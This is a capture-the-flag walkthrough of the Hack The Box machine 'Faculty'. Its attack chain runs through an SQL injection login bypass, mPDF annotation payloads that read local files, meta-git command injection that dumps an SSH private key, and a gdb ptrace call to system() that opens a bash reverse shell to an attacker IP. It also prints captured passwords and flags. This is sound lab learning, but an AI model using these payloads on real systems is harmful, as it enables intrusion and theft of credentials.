---
title: "HTB - Faculty"
categories: [box]
date: 2020-07-30
comments: true
image: /images/walkthroughs/hackthebox/faculty/logo.png
favicon: /images/walkthroughs/hackthebox/faculty/logo.png
description: HTB - Faculty walkthrough
---

# Faculty

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/banner.png" width="70%"/>
</p>


## Summary

Faculty is a medium dificulty machine were we have a managing website with a vulnerable login form for the administration site. Using basic SQLi techniques we get in. Then we discover mPDF, a vulnerbale HTML to PDF package that we can use to trigger LFI vulnerability. Checking for interesting files, we retrieve a password for the _gbyolo_ user from the DB.php file. Using those password for SSH into the machine, we can trigger Arbitrary File Read on meta-git packagae that can be run as _developer_ (user with flag in the machine). Then for privesc we use gbd SYS_TRACE capability to make a system call from a debugged root process and get a reverse shell as root.


## Enumeration

Stating with nmap:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 13:47 EDT
Nmap scan report for 10.10.11.169
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We cannot see too much, only the ports 22 and 80. Let's add faculty.htb to etc/hosts:

10.10.11.169 faculty.htb

When entering the website we land into a login page asking for a FacultyID:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/1_0_web.png" width="70%"/>
</p>

We can use gobuster for some path enumeration:

```bash
gobuster dir -u "http://faculty.htb" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -t 15

===============================================================
2022/07/25 13:52:23 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
/login.php            (Status: 200) [Size: 4860]                               
/index.php            (Status: 302) [Size: 12193] [--> login.php]              
/test.php             (Status: 500) [Size: 0]                                  
/header.php           (Status: 200) [Size: 2871]                               
/.                    (Status: 302) [Size: 12193] [--> login.php]              
/topbar.php           (Status: 200) [Size: 1206]                               
/mpdf                 (Status: 301) [Size: 178] [--> http://faculty.htb/mpdf/]

```

On the admin path we can see other login form. It could be for administration purposes:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/1_1_login.png" width="70%"/>
</p>


Let's also enumerate the admin path:

```bash
gobuster dir -u "http://faculty.htb/admin" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -t 15

===============================================================
2022/07/25 14:13:55 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 5618]
/index.php            (Status: 302) [Size: 13897] [--> login.php]
/download.php         (Status: 200) [Size: 17]                   
/ajax.php             (Status: 200) [Size: 0]                    
/home.php             (Status: 200) [Size: 2995]                 
/assets               (Status: 301) [Size: 178] [--> http://faculty.htb/admin/assets/]
/database             (Status: 301) [Size: 178] [--> http://faculty.htb/admin/database/]
/users.php            (Status: 200) [Size: 1593]                                        
/header.php           (Status: 200) [Size: 2691]                                        
/events.php           (Status: 500) [Size: 1193]                                        
/article.txt          (Status: 200) [Size: 0]                                           
/.                    (Status: 302) [Size: 13897] [--> login.php]                       
/readme.txt           (Status: 200) [Size: 0]                                           
/courses.php          (Status: 200) [Size: 14766]                                       
/schedule.php         (Status: 200) [Size: 5553]                                        
/faculty.php          (Status: 200) [Size: 8532]                                        
/navbar.php           (Status: 200) [Size: 1116]                                        
/db_connect.php       (Status: 200) [Size: 0]                                           
/subjects.php         (Status: 200) [Size: 12162]                                       
/topbar.php           (Status: 200) [Size: 1201]                                        
/site_settings.php    (Status: 200) [Size: 2275]
```

I usually run SQLMap on the login websites when checking for other stuff manually. On the login we have a straight forward SQLi:

```sql
'
username field: ' or 1=1#
'
password field: ' or 1=1#
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_0_admin.png" width="90%"/>
</p>


On the meantime, the SQLMap tool found a SQL time based:


```bash
sqlmap -r login --dbms=mysql --dump
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/2_0_sqli.png" width="70%"/>
</p>


```bash
Database: scheduling_db
Table: users
[1 entry]
+----+---------------+------+----------------------------------+----------+
| id | name          | type | password                         | username |
+----+---------------+------+----------------------------------+----------+
| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
+----+---------------+------+----------------------------------+----------+


Database: scheduling_db
Table: faculty
[3 entries]
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
| id | id_no    | email              | gender | address             | contact        | lastname | firstname | middlename |
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
| 1  | 63033226 | jsmith@faculty.htb | Male   | 151 Blue Lakes Blvd | (646) 559-9192 | Smith    | John      | C          |
| 2  | 85662050 | cblake@faculty.htb | Female | 225 Main St         | (763) 450-0121 | Blake    | Claire    | G          |
| 3  | 30903070 | ejames@faculty.htb | Male   | 142 W Houston St    | (702) 368-3689 | James    | Eric      | P          |
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
```

We have the following credentials, it cannot be found on crackstation (even with the sqlmap, we could reuse this password on SSH or something):

**Administrator:1fecbe762af147c1176a0fc2c722a345**


We have the user IDs, we can use them to check user's funcitonallity:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/3_0_in.png" width="90%"/>
</p>


There is nothing interesting there, so let's move into the administration pane. On the subject tab I could see that I can insert new subjects and also the PDF export functionallity which makes me think that there is some king of vuln in this way.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_1_pdf.png" width="90%"/>
</p>

When hitting the download button, we do a POST with the data to be inputed on the PDF. This data is on HTML, maybe there is an engine to convert it to PDF. The response to this POST request is a link to the PDF on a new tab:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_2_download.png" width="90%"/>
</p>

HTML data sent to the download.php:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_3_pdf_decode.png" width="90%"/>
</p>

The new tab has a new URL path in the previously seen _mpdf_ directory (check gobuster output):

http://faculty.htb/mpdf/tmp/OKDv39ws0upcH5nmxBezRGZ6K1.pdf

When downlading a dinamic generated PDF I always check the metadata for any hint:

```bash
kali@kali:~/Desktop/HackTheBox/Faculty$ exiftool OKDv39ws0upcH5nmxBezRGZ6K1.pdf 
ExifTool Version Number         : 12.36
File Name                       : OKDv39ws0upcH5nmxBezRGZ6K1.pdf
Directory                       : .
File Size                       : 1759 bytes
File Modification Date/Time     : 2022:07:25 15:17:15-04:00
File Access Date/Time           : 2022:07:25 15:17:15-04:00
File Inode Change Date/Time     : 2022:07:25 15:17:42-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2022:07:25 20:16:03+01:00
Modify Date                     : 2022:07:25 20:16:03+01:00
```

The **mPDF 6.0** seems like a library or something. It is like the directory name itself. And it has a [Deserialization of Untrusted Data vulnerability](https://snyk.io/vuln/composer:mpdf%2Fmpdf) on version under 7.1.8 and some [LFI on version 6.0](https://github.com/mpdf/mpdf/issues/356):

First I'm trying the LFI, then if does not work I will go over the exploit explained in the [GitHub issue](https://github.com/mpdf/mpdf/issues/949) and his [YouTube video](https://www.youtube.com/watch?v=tbjtfGvym4M).

For the LFI, we can see that the website redirect us to download.php with the PDF in base64 and with two URL decode after that. So we will replace that PDF with the one with out annotation and our /etc/passwd file:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_3_pdf_decode.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_33_encode.png" width="90%"/>
</p>

Then we can see the attachement on the PDF (first image on the browser, the second one on a PDF reader):

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_4_attached.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/4_5_attached.png" width="90%"/>
</p>


And when clicking on the attackement, we can see the file:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Recalling the gobuster output now that we have LFI, I remember the db_connect.php on the /admin path. We can try to exfiltrate it looking for credentials.

With the following payloads I get an error on the PDF generation, probably, the directory are not correct or files does not exist. Also for the flag. Probably, the web app is running as developer...

```xml
<annotation file="/var/www/html/admin/db_connect.php" content="/var/www/html/admin/db_connect.php"  icon="Graph" title="Attached File: db_connect.php" pos-x="195" />

<annotation file="/home/gbyolo/.ssh/id_rsa" content="/home/gbyolo/.ssh/id_rsa"  icon="Graph" title="Attached File: /home/gbyolo/.ssh/id_rsa" pos-x="195" />

<annotation file="/home/gbyolo/user.txt" content="/home/gbyolo/user.txt"  icon="Graph" title="Attached File: flag" pos-x="195" />
```

Tried to trigger an error on the website to get some kind of exception trace with the file or directory and found the following one by adding an empty event on the calendar and inputting some gibberish:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/5_0_error.png" width="90%"/>
</p>

Now that we can find the absolute path, let's use it to dump the file:

```xml
<annotation file="/var/www/scheduling/admin/db_connect.php" content="/var/www/scheduling/admin/db_connect.php"  icon="Graph" title="Attached File: db_connect.php" pos-x="195" />


PDF=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9kYl9jb25uZWN0LnBocCUyNTIyJTI1MjBjb250ZW50PSUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9kYl9jb25uZWN0LnBocCUyNTIyJTI1MjAlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

Then in the attachment we find the following data:

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));

```

We tried the pass for the developer account and the gbyolo and turned out to be gbyolo's account:

**gbyolo:Co.met06aci.dly53ro.per**

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/6_0_in_machine.png" width="90%"/>
</p>


## Lateral movement

User _gbyolo_ does not have any flag, it can be on the _developer_ user. When having the password, I always go for sudo -l command to check if the user can run a command as some other user and in this case we can run commands as the _developer_ user:

```bash
-bash-5.0$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

I have never seen that tool. First Google results for the meta-git plugin shows this vuln in [HackerOne](https://hackerone.com/reports/728040)

Running the following command to trigger the vulnerability will show us the user flag (note, run it out of the _gbyolo_ user to trigger the "no such file or directory exception" instead of the "permission denied"):

```bash
-bash-5.0$ sudo -u developer meta-git clone 'sss || cat /home/developer/user.txt'
meta git cloning into 'sss || cat /home/developer/user.txt' at user.txt

user.txt:
fatal: repository 'sss' does not exist
218a082d9f0366368e75b11db86a69a6
cat: user.txt: No such file or directory
user.txt: command 'git clone sss || cat /home/developer/user.txt user.txt' exited with error: Error: Command failed
```

``` 218a082d9f0366368e75b11db86a69a6 ```

Correct execution out of the home directory:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/7_0_user.png" width="90%"/>
</p>

No output when triggering "permission denied" exception:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/7_1_error.png" width="90%"/>
</p>


## More Lateral movement

First thing was trying to exfiltrate a private key for the developer user and it has one, so we can now connect through SSH.

```bash
-bash-5.0$ sudo -u developer meta-git clone 'sss || cat /home/developer/.ssh/id_rsa'
meta git cloning into 'sss || cat /home/developer/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: repository 'sss' does not exist
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Using the private key we get in as _developer_ user:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/8_0_developer.png" width="90%"/>
</p>



## Privesc

Checking the linpeas.sh output I could see first some emails and the the cron job for sending emails (?)

```bash
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * /home/developer/sendmail.sh >/dev/null 2>&1
```


Mails:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/9_1_mails.png" width="90%"/>
</p>


Checking the emails:

```bash
bash-5.0$ su gbyolo
Password: 
bash-5.0$ ls
gbyolo  root
bash-5.0$ cat gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

But in the developer home directory there is no sendemail.sh... So I ended up in a dead end. Looked for other vectors. Then I took a look at the capabilities:

```bash
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

The one of **gdb** stands out from the normal ones, so I went to [GTFObins](https://gtfobins.github.io/gtfobins/gdb/#capabilities) and there was an specific one for capabilities but cannot apply it in this scenario since it is for CAP_SETUID and we have CAP_SYS_PTRACE. In this case, we can escape the container by injecting a shellcode inside some process running inside the host. For that, I found the following scenario on [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace). Let's retrieve processes owned by root:

```bash
bash-5.0$ ps -eaf | grep -s "root"
root         661       1  0 Jul25 ?        00:00:00 /usr/bin/VGAuthService
root         665       1  0 Jul25 ?        00:01:37 /usr/bin/vmtoolsd
root         673       1  0 Jul25 ?        00:00:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         718       1  0 Jul25 ?        00:00:02 /usr/lib/accountsservice/accounts-daemon
root         729       1  0 Jul25 ?        00:00:04 /usr/sbin/irqbalance --foreground
root         730       1  0 Jul25 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         731       1  0 Jul25 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root         740       1  0 Jul25 ?        00:00:01 /lib/systemd/systemd-logind
root         742       1  0 Jul25 ?        00:00:00 /usr/lib/udisks2/udisksd
root         760       1  0 Jul25 ?        00:00:00 /usr/sbin/ModemManager
root         915       1  0 Jul25 ?        00:00:00 /usr/sbin/cron -f
root         916       1  0 Jul25 ?        00:00:06 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         924       1  0 Jul25 ?        00:00:07 bash /root/service_check.sh
```

Had no luck with process like cron and bash, they have no "system" symbol:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/10_0_no_gdb.png" width="90%"/>
</p>

Trying different processes, I found that the _/usr/bin/vmtoolsd_ process let me execute the system call:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/10_1_vm.png" width="90%"/>
</p>


```bash
bash-5.0$ gdb -p 665
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.                                                                                                                                      
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 665
[New LWP 685]
[New LWP 686]
[New LWP 689]
0x00007ffa9c1f599f in ?? ()

call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.168/5454 0>&1'")
```

Obviously, create your netcat listener on your machine, then get the flag. If having isses with the system symbol, a safe choice is the python3 process.


<p align="center">
  <img src="/images/walkthroughs/hackthebox/faculty/11_root.png" width="90%"/>
</p>

``` 9d6d066b09f6f7e38a70085112861ffe ```